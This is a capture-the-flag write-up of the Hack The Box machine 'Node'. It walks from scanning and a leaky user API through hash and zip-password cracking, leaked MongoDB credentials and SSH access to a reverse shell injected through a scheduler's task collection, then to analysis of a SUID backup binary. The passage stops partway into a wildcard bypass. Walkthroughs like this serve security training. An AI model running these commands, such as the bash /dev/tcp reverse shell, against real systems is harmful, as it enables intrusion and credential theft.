#Express #Crackstation #mongo #Zip

# Reconnaissance

```bash
# Automatic tools
# nmapAutomator (https://github.com/21y4d/nmapAutomator)
cd /usr/local/bin/
sudo ./nmapAutomator.sh --host 10.10.10.58 --type All
# Nmap
nmap -sV -sC -A 10.10.10.58 -Pn
```

```txt
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/HackTheBox/Node]
‚îî‚îÄ$ nmap -sV -sC -A 10.10.10.58 -Pn

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-07 12:16 CST
Nmap scan report for 10.10.10.58
Host is up (0.21s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  ppp?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.63 seconds

```
# Enumeration
`nmap`¬†found two open TCP ports, SSH (22) and something on TCP 3000

## Enumerate on 3000

Let's access for  http://10.10.10.58:3000/ , and we will find a HTTP page which name is MyPlace.

![[Node-01.png]]

When click http://10.10.10.58:3000/login we got a login page:

![[Node-02.png]]

I tried some basic usernames/passwords, and some basic SQL injections (https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/), but to no avail.

### Directory Brute Force
So on next step we will use brute force tool ferobuster to find any folder.

```bash
feroxbuster -u http://10.10.10.58:3000
```

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/HackTheBox/Node]
‚îî‚îÄ$ feroxbuster -u http://10.10.10.58:3000
\
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ü§ì                 ver: 2.7.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://10.10.10.58:3000
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 üëå  Status Codes          ‚îÇ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.7.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üèÅ  HTTP methods          ‚îÇ [GET]
 üîÉ  Recursion Depth       ‚îÇ 4
 üéâ  New Version Available ‚îÇ https://github.com/epi052/feroxbuster/releases/latest
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
WLD      GET       90l      249w     3861c Got 200 for http://10.10.10.58:3000/edb7a0df05c54d4f92b7e7d31508d3d2 (url length: 32)
WLD      GET         -         -         - Wildcard response is static; auto-filtering 3861 responses; toggle this behavior by using --dont-filter
WLD      GET       90l      249w     3861c Got 200 for http://10.10.10.58:3000/51c60457539e4fb3b19db76bc9e4aa0fb2c945259f5b4e35b07e867bc629b85b65fcdccc75634720ad8387bfe42670cd (url length: 96)
301      GET        9l       15w      173c http://10.10.10.58:3000/uploads => /uploads/
301      GET        9l       15w      171c http://10.10.10.58:3000/assets => /assets/
301      GET        9l       15w      179c http://10.10.10.58:3000/assets/css => /assets/css/
301      GET        9l       15w      177c http://10.10.10.58:3000/assets/js => /assets/js/
301      GET        9l       15w      187c http://10.10.10.58:3000/assets/js/misc => /assets/js/misc/
301      GET        9l       15w      185c http://10.10.10.58:3000/assets/js/app => /assets/js/app/
301      GET        9l       15w      209c http://10.10.10.58:3000/assets/js/app/controllers => /assets/js/app/controllers/
301      GET        9l       15w      171c http://10.10.10.58:3000/vendor => /vendor/
301      GET        9l       15w      185c http://10.10.10.58:3000/vendor/jquery => /vendor/jquery/
üö® Caught ctrl+c üö® saving scan state to ferox-http_10_10_10_58:3000-1659852635.state ...
üö® Caught ctrl+c üö® saving scan state to ferox-http_10_10_10_58:3000-1659852636.state ...
[#######>------------] - 3m    115102/300000  5m      found:11      errors:67487  
[##########>---------] - 3m     15681/30000   81/s    http://10.10.10.58:3000 
[##########>---------] - 3m     15269/30000   79/s    http://10.10.10.58:3000/ 
[#######>------------] - 3m     11719/30000   60/s    http://10.10.10.58:3000/uploads 
[#########>----------] - 3m     14342/30000   74/s    http://10.10.10.58:3000/assets 
[#########>----------] - 3m     14505/30000   76/s    http://10.10.10.58:3000/assets/css 
[########>-----------] - 3m     12538/30000   65/s    http://10.10.10.58:3000/assets/js 
[########>-----------] - 3m     13415/30000   70/s    http://10.10.10.58:3000/assets/js/misc 
[########>-----------] - 3m     13380/30000   70/s    http://10.10.10.58:3000/assets/js/app 
[########>-----------] - 2m     12436/30000   81/s    http://10.10.10.58:3000/vendor 
[######>-------------] - 1m     10196/30000   86/s    http://10.10.10.58:3000/vendor/jquery                 
```

None of these were particularly interesting.¬†`/uploads`¬†redirects back to¬†`/`.

###  Tech Stack

Looking at the HTTP response, it confirms the server is running Express:

![[Node-03.png]]

```
HTTP/1.1 200 OK
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Sat, 02 Sep 2017 11:27:58 GMT
ETag: W/"f15-15e4258ef70"
Content-Type: text/html; charset=UTF-8
Content-Length: 3861
Date: Sun, 07 Aug 2022 06:17:21 GMT
Connection: close
```

Express is a Fast, unopinionated, minimalist web framework for Node.js (https://expressjs.com/), The benefits of using JavaScript on the server is that it allows simplified interactions between the client-side JavaScript and the server-side JavaScript.

In the firefox dev tools, I can see different JS files which running on the client, 

![[Node-04.png]]

```txt
var controllers = angular.module('controllers', []);
var app = angular.module('myplace', [ 'ngRoute', 'controllers' ]);

app.config(function ($routeProvider, $locationProvider) {
  $routeProvider.
    when('/', {
      templateUrl: '/partials/home.html',
      controller: 'HomeCtrl'
    }).
    when('/profiles/:username', {
      templateUrl: '/partials/profile.html',
      controller: 'ProfileCtrl'
    }).
    when('/login', {
      templateUrl: '/partials/login.html',
      controller: 'LoginCtrl'
    }).
    when('/admin', {
      templateUrl: '/partials/admin.html',
      controller: 'AdminCtrl'
    }).
    otherwise({
      redirectTo: '/'
    });

    $locationProvider.html5Mode(true);
});
```

`app.js`¬†defines the different routes for site, each with a different controller. The controllers are in the¬†`/controllers`¬†folder, and each have references to different calls to paths server-side starting with¬†`/api`. The two endpoints in¬†`admin.js`¬†are¬†`/api/admin/backup`¬†and¬†`/api/session`.

And we check the home.js file contents, and will find a url for /api/users/latest

```txt
var controllers = angular.module('controllers');

controllers.controller('HomeCtrl', function ($scope, $http) {
  $http.get('/api/users/latest').then(function (res) {
    $scope.users = res.data;
  });
});
```

Let's access this contents:

```bash
curl -s 10.10.10.58:3000/api/users/ | jq .
# or use these commands
curl -s 10.10.10.58:3000/api/users/mark | jq .
curl -s 10.10.10.58:3000/api/users/0xdf | jq .
```

Excellent! we will get a username and password hash of this system:

```txt

[
  {
    "_id": "59a7365b98aa325cc03ee51c",
    "username": "myP14ceAdm1nAcc0uNT",
    "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
    "is_admin": true
  },
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]

```
![[Node-07.png]]
### Crack Hashes

I‚Äôll use¬†`jq`¬†to get just the password hashes:

```bash
curl -s 10.10.10.58:3000/api/users/ | jq -r '.[].password'
```

```hash
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0
```
We use¬†[https://crackstation.net](https://crackstation.net/)¬†to decode the hashes that we found earlier.

![[Node-06.png]]

 For unsalted hashes with a standard wordlist, it‚Äôs just easier to check online sites first rather than cracking myself. I‚Äôll drop the hashes into CrackStation, and three of the four break. And we know the password of `myP14ceAdm1nAcc0uNT` within admin privilege is `manchester`

# Exploitation

Then we used this username and password to login the page.

![[Node-08.png]]

After login, we try to download  backup file (Remerber use burpsuite to download this file).

```bash
file myplace.backup
wc myplace.backup
# let's check its file content
head myplace.backup 
```

![[Node-09.png]]

we find this type was encoded like base64. Let's check this filetype with 

The character set matches the base64 character set. On decoding it, there‚Äôs a Zip Archive:

```bash
cat myplace.backup | base64 -d > myplace.backup.decode
file myplace.backup.decode
mv myplace.backup.decode myplace.backup.zip
```

![[Node-10.png]]

### Crack the zip password

Trying to unzip the archive (now renamed to¬†`.zip`) requires a password:

`zip2john`¬†will get a hash from the zip:

```bash
zip2john myplace.backup.zip 2>/dev/null | tee myplace.backup.zip.hash
```

```txt
myplace.backup.zip:$pkzip$8*1*1*0*0*11*2938*0461ed924efc800ec049355d4c9d07d8c9*1*0*0*17*996a*50df0dd889de2c35b8f8646466cf28483544677cae2d70*1*0*0*19*5083*0c51912a02902409dedf8d873970dc5f0155b99033af14428b*1*0*0*1f*b16f*f0f95e2c9feacad66357f6b748aeaa9754f0b647fe7800ec95f9d26055faa5*1*0*0*24*a3cc*82c62e9f57da5749fdd7f1e522409286b5912d1e34506f93e712fffe2640b2d327a4b654*1*0*8*24*5083*929c810608962d3f81cbaeceee60cbf31914300700fdcab70bd3ab2aa18aebd3563adff1*1*0*0*24*9679*67bb45c3551aee2a931090169e64405c49c92712e1193af9a2ab7733a38d7ad50f4db24f*2*0*11*5*118f1dfc*94cb*67*0*11*3d0f*9543f2535fa8e27e2b8c2e98291998c2c2*$/pkzip$::myplace.backup.zip:var/www/myplace/node_modules/qs/.eslintignore, var/www/myplace/node_modules/express/node_modules/qs/.eslintignore, var/www/myplace/node_modules/string_decoder/.npmignore, var/www/myplace/node_modules/isarray/.npmignore, var/www/myplace/node_modules/ipaddr.js/.npmignore, var/www/myplace/node_modules/cookie-signature/.npmignore, var/www/myplace/node_modules/isarray/.travis.yml, var/www/myplace/node_modules/debug/node.js:myplace.backup.zip
```
`john`¬†will break this very quickly:

```bash
john myplace.backup.zip.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=PKZIP
```

```txt
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/HackTheBox/Node]
‚îî‚îÄ$ john myplace.backup.zip.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=PKZIP
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
magicword        (myplace.backup.zip)     
1g 0:00:00:00 DONE (2022-08-07 17:47) 14.28g/s 2691Kp/s 2691Kc/s 2691KC/s sandriux..beckyg
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Now I can unzip the archive with password `magicword`.

```bash
unzip myplace.backup.zip
```

![[Node-11.png]]

when we unzip and open app.js, we will find this part:

```js
const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
```

Then we guess maybe `mark:5AYRft73VtFpc84k` was credential for the mark.

### Shell of Mark
let's using this credential to ssh.

```bash
ssh mark@10.10.10.58
# password
5AYRft73VtFpc84k
```

Excellent!  we could ssh to get a shell.

```bash
id
whoami
hostname
cd /home/tom
cat user.txt
# we will find the message tell us we are failed
cat: user.txt: Permission denied
```

![[Node-12.png]]

![[Node-13.png]]

Unfortunately, we could type this content of file, so let's thinking other methods. 
Let's check its privileges.

```bash
ls -l
```

![[Node-14.png]]

The only intended way to reach this account, is by looking at the currently running services.

### Shell of tom

When we take a look at the process running into the system, we find that it is running app.js as tom user.

```bash
ps aux
```

![[Node-15.png]]

```txt
tom       1233  0.1  9.9 1061952 75520 ?       Ssl  05:10   0:56 /usr/bin/node /var/www/myplace/app.js
tom       1240  0.0  5.7 1074616 43440 ?       Ssl  05:10   0:07 /usr/bin/node /var/scheduler/app.js
```

`/var/www/myplace/app.js`¬†is the webapp I already interfaced with, so I‚Äôll turn to¬†`/var/scheduler/app.js`:

```bash
cat /var/scheduler/app.js
```

```txt
mark@node:/tmp$ cat /var/scheduler/app.js
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});

```

This script will connect to the Mongo database, and then run a series of commands every 30 seconds. It will get items out of the¬†`tasks`¬†collection. For each doc, it will pass¬†`doc.cmd`¬†to¬†`exec`¬†to run it, and then delete the doc.

I‚Äôll connect to the DB using the Mongo client specifying the user, password, and database to connect to:

```bash
mongo -u mark -p 5AYRft73VtFpc84k scheduler
# In Mongo, a database (like¬†`scheduler`) has collections (kind of like tables in SQL). This db has one collection:
show collections
# The collection has no objects in it:
db.tasks.find()
```

![[Node-16.png]]

#### Exploit mongo

##### try

I‚Äôll test execution by adding a command to¬†`touch`¬†a file in¬†`/tmp`:

```bash
db.tasks.insert({"cmd": "touch /tmp/0xdf"})
db.tasks.find()
```

![[Node-17.png]]

In¬†`/tmp`, a new file is there owned by tom:

![[Node-18.png]]

##### exploit
Build up a local listener:

```bash
# lhost
nc -vlp 1234
```

Now I‚Äôll insert a reverse shell into the DB as the command:

```bash
mongo -u mark -p 5AYRft73VtFpc84k scheduler
db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.11/1234 0>&1'"})
db.tasks.find()
```

![[Node-19.png]]

And wait 30 seconds we will get the shell! Very Nice.

##### capture userflag

```bash
id
# uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
cat /home/tom/user.txt
# flag
e1156acc3574e04b06908ecf76be91b1
```

![[Node-20.png]]

##### upgrade the shell

Now Let's upgrade the shells.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
```

# Privilege Escalation

## linpeas.sh

```bash
# download LinEnum
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
# lhost
python -m SimpleHTTPServer 80
# rhost
cd /tmp  
wget http://10.10.14.6/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
# Write the output to txt
nano linpeas.txt
```

From this output we check the Backup files (limited 100)

```
-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
```

**SUID**¬†is a special file permission for executable files which enables other users to run the file with effective permissions of the file owner.

We look for any suid files using find:

```bash
find / -perm /4000 2> /dev/null
```

![[Node-21.png]]

The /usr/local/bin/backup file seems interesting. Having a look at its permissions, we see that it is owned by root and has the admin group ownership. And our user tom is a member of the group admin and so we can run this.

we find a root file within admin groups, let's check this content.

```bash
cat /usr/local/bin/backup
strings /usr/local/bin/backup
```

we could find this contents:

```txt                                                                                                                                                                                                                                                                                                                         
------------------------------------------------------------._.---'                                                                                                 
Could not open file                                                                                                                                                             
Validated access token                                                                                                                                                          
Ah-ah-ah! You didn't say the magic word!                                                                                                                                        
Finished! Encoded backup is below:                                                                                                                                              
UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==                                                            
/root                                                                                                                                                                           
/etc                                                                                                                                                                            
/tmp/.backup_%i                                                                                                                                                                 
/usr/bin/zip -r -P magicword %s %s > /dev/null                                                                                                                                  
/usr/bin/base64 -w0 %s                                                                                                                                                                                
```

Excellent, we find it was encrypted with `magicword`

### Dynamic Analysis

#### Number of Args

Before pulling this binary back and opening in in Ghidra, I‚Äôll try running it on Node. It returns without any output:

```bash
backup
backup a
backup a a
backup a a a
```

![[Node-23.png]]
This makes sense with how this binary is called from¬†`app.js`¬†above. It‚Äôs complaining about needing a magic word.

#### Token Check

https://man7.org/linux/man-pages/man1/ltrace.1.html

I‚Äôll run that again with¬†`ltrace`, and change the three args so that they are different (to better track which is which), so¬†`ltrace a b c`. I‚Äôll walk through the output in chunks. First it checks the effective user id, and then sets the uid to 0, root. Then it does a string comparison between ‚Äúa‚Äù (first arg input) and ‚Äú-q‚Äù:

```bash
cd /usr/local/bin/
ltrace backup a b c
```

The paramter list, in order from left to right, is:

the output mode , -q for quiet, or any other string for a verbose output.
the access token
the directory to archive

```txt
tom@node:/usr/local/bin$ ltrace backup a b c                                                                                                                                    
ltrace backup a b c                                                                                                                                                             
__libc_start_main(0x80489fd, 4, 0xffa50ff4, 0x80492c0 <unfinished ...>                                                                                                          
geteuid()                                        = 1000                                                                                                                         
setuid(1000)                                     = 0                                                                                                                            
strcmp("a", "-q")                                = 1                                                                                                                            
puts("\n\n\n             ________________"...)   = 69                                                                                                                           
puts("            /                   "...)      = 67                                                                                                                           
puts("           |    ________________"...)      = 68                                                                                                                           
puts("           |   |                "...)      = 68                                                                                                                           
puts("           |   |                "...)      = 68                                                                                                                           
puts("           |   |                "...)      = 68                                                                                                                           
puts("           |   |                "...)      = 68                                                                                                                           
puts("           |   |                "...)      = 68                                                                                                                           
puts("           |   |                "...)      = 68                                                                                                                           
puts("           |   |             Sec"...)      = 68                                                                                                                           
puts("           |   |                "...)      = 68                                                                                                                           
puts("           |   |                "...)      = 68                                                                                                                           
puts("           |   |                "...)      = 68                                                                                                                           
puts("           |   |                "...)      = 68                                                                                                                           
puts("           |   |                "...)      = 68                                                                                                                           
puts("           |   |                "...)      = 68                                                                                                                           
puts("           |   |________________"...)      = 68                                                                                                                           
puts("           |                    "...)      = 68                                                                                                                           
puts("            \\___________________"...)     = 68                                                                                                                           
puts("                   \\____________"...)     = 61                                                                                                                           
puts("                ________________"...)      = 64                                                                                                                           
puts("             _-'    .-.-.-.-.-.-"...)      = 67                                                                                                                           
puts("          _-'.-.-. .---.-.-.-.-."...)      = 70                                                                                                                           
puts("       _-'.-.-.-. .---.-.-.-.-.-"...)      = 73                                                                                                                           
puts("    _-'.-.-.-.-. .-----.-.-.-.-."...)      = 76                                                                                                                           
puts(" _-'.-.-.-.-.-. .---.-. .-------"...)      = 79                                                                                                                           
puts(":-------------------------------"...)      = 80                                                                                                                           
puts("`---._.-------------------------"...)      = 82                                                                                                                           
strncpy(0xffa50eb8, "b", 100)                    = 0xffa50eb8                                                                                                                   
strcpy(0xffa50ea1, "/")                          = 0xffa50ea1                                                                                                                   
strcpy(0xffa50ead, "/")                          = 0xffa50ead                                                                                                                   
strcpy(0xffa50e37, "/e")                         = 0xffa50e37                                                                                                                   
strcat("/e", "tc")                               = "/etc"                                                                                                                       
strcat("/etc", "/m")                             = "/etc/m"                                                                                                                     
strcat("/etc/m", "yp")                           = "/etc/myp"                                                                                                                   
strcat("/etc/myp", "la")                         = "/etc/mypla"                                                                                                                 
strcat("/etc/mypla", "ce")                       = "/etc/myplace"                                                                                                               
strcat("/etc/myplace", "/k")                     = "/etc/myplace/k"                                                                                                             
strcat("/etc/myplace/k", "ey")                   = "/etc/myplace/key"                                                                                                           
strcat("/etc/myplace/key", "s")                  = "/etc/myplace/keys"                                                                                                          
fopen("/etc/myplace/keys", "r")                  = 0x9dd2010                                                                                                                    
fgets("a01a6aa5aaf1d7729f35c8278daae30f"..., 1000, 0x9dd2010) = 0xffa50a4f                                                                                                      
strcspn("a01a6aa5aaf1d7729f35c8278daae30f"..., "\n") = 64                                                                                                                       
strcmp("b", "a01a6aa5aaf1d7729f35c8278daae30f"...) = 1                                                                                                                          
fgets("45fac180e9eee72f4fd2d9386ea7033e"..., 1000, 0x9dd2010) = 0xffa50a4f                                                                                                      
strcspn("45fac180e9eee72f4fd2d9386ea7033e"..., "\n") = 64                                                                                                                       
strcmp("b", "45fac180e9eee72f4fd2d9386ea7033e"...) = 1                                                                                                                          
fgets("3de811f4ab2b7543eaf45df611c2dd25"..., 1000, 0x9dd2010) = 0xffa50a4f                                                                                                      
strcspn("3de811f4ab2b7543eaf45df611c2dd25"..., "\n") = 64                                                                                                                       
strcmp("b", "3de811f4ab2b7543eaf45df611c2dd25"...) = 1                                                                                                                          
fgets("\n", 1000, 0x9dd2010)                     = 0xffa50a4f                                                                                                                   
strcspn("\n", "\n")                              = 0                                                                                                                            
strcmp("b", "")                                  = 1                                                                                                                            
fgets(nil, 1000, 0x9dd2010)                      = 0                                                                                                                            
strcpy(0xffa4fa88, "Ah-ah-ah! You didn't say the mag"...) = 0xffa4fa88                                                                                                          
printf(" %s[!]%s %s\n", "\033[33m", "\033[37m", "Ah-ah-ah! You didn't say the mag"...) = 58                                                                                     
exit(1                                                                                                                                                                          
                                                                                                                                                                                
                                                                                                                                                                                
             ____________________________________________________                                                                                                               
            /                                                    \                                                                                                              
           |    _____________________________________________     |                                                                                                             
           |   |                                             |    |                                                                                                             
           |   |                                             |    |                                                                                                             
           |   |                                             |    |                                                                                                             
           |   |                                             |    |                                                                                                             
           |   |                                             |    |                                                                                                             
           |   |                                             |    |                                                                                                             
           |   |             Secure Backup v1.0              |    |                                                                                                             
           |   |                                             |    |                                                                                                             
           |   |                                             |    |                                                                                                             
           |   |                                             |    |                                                                                                             
           |   |                                             |    |                                                                                                             
           |   |                                             |    |                                                                                                             
           |   |                                             |    |                                                                                                             
           |   |_____________________________________________|    |                                                                                                             
           |                                                      |                                                                                                             
            \_____________________________________________________/                                                                                                             
                   \_______________________________________/                                                                                                                    
                _______________________________________________                                                                                                                 
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_                                                                                                              
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_                                                                                                           
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_                                                                                                        
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_                                                                                                     
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_                                                                                                  
:-----------------------------------------------------------------------------:                                                                                                 
`---._.-----------------------------------------------------------------._.---'                                                                                                 
                                                                                                                                                                                
                                                                                                                                                                                
 [!] Ah-ah-ah! You didn't say the magic word!                                                                                                                                   
                                                                                                                                                                                
                                                                                                                                                                                
 <no return ...>                                                                                                                                                                
+++ exited (status 1) +++                                                 
```

## Method1 -Using Wildcards (Easy)
To easiest route to getting the root flag, is to use wildcards to work around the blacklisted keywords. If attempting to use backup tool to backup the /root directory, users will be presented with a fake backup:

When Examning the code of app.js will show it's calling it with following effective command:

```
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
```

```
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
```

```bash
# if we attempting to use backup tool to backup the /root directory
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root
```

```
